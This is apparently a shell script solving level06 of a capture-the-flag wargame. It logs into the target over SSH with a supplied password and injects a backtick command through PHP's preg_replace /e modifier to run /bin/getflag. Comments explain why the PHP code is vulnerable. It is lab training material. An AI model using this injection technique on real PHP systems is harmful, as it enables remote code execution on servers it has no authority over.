#!/usr/bin/env bash

SCRIPT=$(cat <<EOF
echo '[x \${\`/bin/getflag\`}]' > /tmp/flag06;
./level06 /tmp/flag06 2>&1 >/dev/null | awk 'NR==1 {print $NF}'
EOF
)

# In the directory of level06 there is a file called level06.php that conntains:

# #!/usr/bin/php
# <?php
# function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
# function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
# $r = x($argv[1], $argv[2]); print $r;
# ?>

# This is a script that takes two parameters and passes them to the function x that will read the contents of the first parameter 
# and replace all instances of "[x <anything>]" with the output of the function y that will replace all "." with " x " and all "@" with " y"
# There's also an executable that seems to be the compiled version of the php script. We can see that
# from the error message: PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
# So we can use this to execute commands on the server by passing them as the first parameter


if [ ! -z "$1" ] && [ ! -z "$2" ] && [ ! -z "$3" ]; then
	PASS=$(sshpass -p $3 ssh -o StrictHostKeyChecking=no level06@$1 -p $2 "$SCRIPT")
	PASS=$(echo $PASS | awk 'NR==1 {print $NF}')
	echo "$PASS"
	echo "$PASS" | awk 'END{print}' > flag06.pwd
else
	echo "Usage: ./flag06.sh <ip address> <port> <password>"
fi
